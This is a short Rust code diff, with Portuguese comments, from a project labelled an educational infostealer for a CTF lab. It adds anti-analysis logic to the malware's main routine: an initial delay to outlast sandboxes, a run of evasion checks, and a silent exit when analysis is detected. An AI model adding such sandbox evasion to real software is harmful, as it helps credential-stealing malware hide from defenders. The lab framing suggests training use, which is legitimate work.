@@ -30,6 +30,7 @@ mod utils;
 use config::Config;
 use loader::{initialize_loader, run_loader_loop, get_hydra_status};
 use utils::anti_analysis::EnvironmentChecker;
+use utils::evasion;
 use utils::helpers::format_size;
 
 /// MyStealer CTF Lab - Educational Infostealer
@@ -95,8 +96,20 @@ async fn main() -> anyhow::Result<()> {
     tracing::subscriber::set_global_default(subscriber)
         .expect("Falha ao configurar logging");
 
-    // Banner apenas para processo principal
+    // Evasion: delay inicial e verificações anti-sandbox
     if !is_secondary {
+        // Delay inicial para evitar sandboxes com timeout curto
+        evasion::initial_delay();
+        
+        // Executa verificações de evasão
+        let evasion_result = evasion::run_all_checks();
+        
+        if evasion_result.is_being_analyzed() && !args.skip_checks {
+            // Comportamento "normal" - não executa se detectar análise
+            std::process::exit(0);
+        }
+        
+        // Banner apenas para processo principal
         print_banner();
     }
 
